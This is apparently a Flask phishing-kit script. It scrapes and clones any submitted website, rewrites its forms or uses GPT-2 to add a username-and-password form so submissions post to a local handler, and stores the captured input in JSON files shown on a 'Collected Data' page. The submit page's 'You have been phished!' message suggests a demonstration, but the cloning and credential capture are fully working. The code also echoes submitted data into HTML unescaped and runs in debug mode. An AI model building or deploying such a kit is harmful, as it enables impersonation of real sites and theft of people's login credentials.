from flask import Flask, request, render_template, redirect, url_for, jsonify, send_from_directory, Response
from bs4 import BeautifulSoup
import os
import requests
import json
from transformers import pipeline, GPT2LMHeadModel, GPT2Tokenizer

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Initialize the local model using HuggingFace Transformers
model_name = 'gpt2'
model = GPT2LMHeadModel.from_pretrained(model_name)
tokenizer = GPT2Tokenizer.from_pretrained(model_name)
generator = pipeline('text-generation', model=model, tokenizer=tokenizer, pad_token_id=tokenizer.eos_token_id)

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup

def copy_resources(soup, base_url, target_dir):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    static_dir = os.path.join(target_dir, 'static')
    if not os.path.exists(static_dir):
        os.makedirs(static_dir)
    
    for tag in soup.find_all(['link', 'script', 'img']):
        attr = 'href' if tag.name == 'link' else 'src'
        if tag.has_attr(attr):
            resource_url = tag[attr]
            if resource_url.startswith(('http', 'https')):
                resource_content = requests.get(resource_url).content
                resource_path = os.path.join(static_dir, os.path.basename(resource_url))
                with open(resource_path, 'wb') as f:
                    f.write(resource_content)
                tag[attr] = url_for('serve_static_file', site_id=os.path.basename(target_dir), filename=os.path.basename(resource_url))
    
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
        file.write(soup.prettify())

def generate_form_with_local_model(action_url):
    prompt = f"""
    Generate a simple HTML form with two inputs - one for username and one for password - and a submit button.
    The form should have the action URL set to "{action_url}" and the method set to "POST".
    """
    generated = generator(prompt, max_length=150, num_return_sequences=1, truncation=True)
    form_html = generated[0]['generated_text']
    return form_html

def replicate_form(form, action_url):
    form['action'] = action_url
    form['method'] = 'POST'
    count = 1
    for input_tag in form.find_all(['input', 'textarea', 'select']):
        input_tag['name'] = input_tag.get('name', f'user_input_{count}')
        count += 1
    return str(form)

def add_phishing_form(soup, target_dir, site_id):
    forms = soup.find_all('form')
    action_url = url_for('handle_submit', site_id=site_id)
    if not forms:
        form_html = generate_form_with_local_model(action_url)
        form_soup = BeautifulSoup(form_html, 'html.parser')
        soup.body.insert(0, form_soup)
    else:
        for form in forms:
            form_html = replicate_form(form, action_url)
            form_soup = BeautifulSoup(form_html, 'html.parser')
            form.replace_with(form_soup)
    
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
        file.write(soup.prettify())

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        site_id = len(os.listdir(os.path.join(BASE_DIR, 'generated_sites')))
        target_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
        data_dir = os.path.join(target_dir, 'data')
        if not os.path.exists(data_dir):
            os.makedirs(data_dir)
        soup = scrape_website(url)
        copy_resources(soup, url, target_dir)
        add_phishing_form(soup, target_dir, site_id)
        return redirect(url_for('view_generated_site', site_id=site_id))

    return render_template('index.html')

@app.route('/site/<int:site_id>')
def view_generated_site(site_id):
    generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
    return send_from_directory(generated_site_dir, 'index.html')

@app.route('/site/<int:site_id>/static/<path:filename>')
def serve_static_file(site_id, filename):
    static_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'static')
    return send_from_directory(static_dir, filename)

@app.route('/submit/<int:site_id>', methods=['POST'])
def handle_submit(site_id):
    data = request.form.to_dict()
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    
    if os.path.exists(data_file):
        with open(data_file, 'r', encoding='utf-8') as file:
            data_list = json.load(file)
    else:
        data_list = []

    data_list.append(data)
    with open(data_file, 'w', encoding='utf-8') as file:
        json.dump(data_list, file, ensure_ascii=False)
    
    return f"""
    <h1>You have been phished!</h1>
    <p>Your submitted data: {data}</p>
    <p><a href='/data/{site_id}'>View Collected Data</a></p>
    <p>Please delete your data if it's real and take necessary precautions.</p>
    """

@app.route('/data/<int:site_id>', methods=['GET', 'POST'])
def view_data(site_id):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if request.method == 'POST':
        data_index = int(request.form['data_index'])
        if os.path.exists(data_file):
            with open(data_file, 'r', encoding='utf-8') as file:
                data_list = json.load(file)
            if 0 <= data_index < len(data_list):
                data_list.pop(data_index)
                with open(data_file, 'w', encoding='utf-8') as file:
                    json.dump(data_list, file, ensure_ascii=False)
        return redirect(url_for('view_data', site_id=site_id))
    else:
        if os.path.exists(data_file):
            with open(data_file, 'r', encoding='utf-8') as file:
                data_list = json.load(file)
            response_html = "<h1>Collected Data</h1><ul>"
            for i, data in enumerate(data_list):
                response_html += f"<li>{data} <form method='POST' style='display:inline;'><input type='hidden' name='data_index' value='{i}'><button type='submit'>Delete</button></form></li>"
            response_html += "</ul>"
            return Response(response_html, mimetype='text/html')
        else:
            return "No data found."

if __name__ == '__main__':
    app.run(debug=True)
